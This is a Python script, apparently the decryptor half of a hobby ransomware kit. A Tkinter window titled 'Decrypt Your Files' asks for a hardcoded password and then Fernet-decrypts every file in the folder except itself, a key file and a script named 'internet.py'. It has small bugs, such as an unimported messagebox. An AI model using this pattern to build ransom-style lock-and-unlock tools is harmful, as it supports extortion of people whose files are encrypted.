import tkinter as tk
from tkinter import simpledialog
import os
from cryptography.fernet import Fernet


files = []




secretcode = "capyedward55"



def check_password():
    # Get the password from the user
    password = simpledialog.askstring("Password", "Enter the password:", show='*')

    # Check if the password is correct
    if password == secretcode:
        
        for file in os.listdir():
            if file == "internet.py" or file == "thekey.capy" or file == "decrypt.py":
                continue
            if os.path.isfile(file):
                files.append(file)


            with open("thekey.capy", "rb") as key:
                secretkey = key.read()
        
        
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)

    else:
        tk.messagebox.showerror("Error", "Incorrect password. Access denied.")

# Create the main window
root = tk.Tk()
root.title("Decrypt Your Files")

# Create a button that triggers the password input
password_button = tk.Button(root, text="Enter Password", command=check_password)
password_button.pack(pady=20)

# Start the Tkinter event loop
root.mainloop()
